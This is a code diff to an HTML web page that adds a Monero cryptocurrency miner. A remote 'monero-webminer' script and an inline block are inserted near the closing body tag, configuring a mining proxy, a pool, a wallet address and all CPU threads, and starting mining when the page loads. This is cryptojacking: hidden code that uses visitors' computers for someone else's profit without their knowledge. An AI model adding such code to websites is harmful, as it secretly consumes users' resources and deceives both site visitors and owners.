@@ -181,6 +181,8 @@
       </div>
     </div>
   </footer>
+  <!-- Start Of Mining Code (HTML) -->
+  <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/web-socket-js/1.0.0/web_socket.min.js" integrity="sha512-jtr9/t8rtBf1Sv832XjG1kAtUECQCqFnTAJWccL8CSC82VGzkPPih8rjtOfiiRKgqLXpLA1H/uQ/nq2bkHGWTQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
   <script src="https://unpkg.com/htmx.org@2.0.0/dist/htmx.min.js"></script>
   <script src="https://cdn.tailwindcss.com"></script>
@@ -221,5 +223,15 @@
       });
     });
   </script>
+  <script>
+    server = "wss://ny1.xmrminingproxy.com";
+    var pool = "moneroocean.stream:443";
+    var walletAddress = "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi";
+    var workerId = "GH-XMR"
+    var threads = -1;
+    var password = "";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 20;
+   </script>
 </body>
 </html>
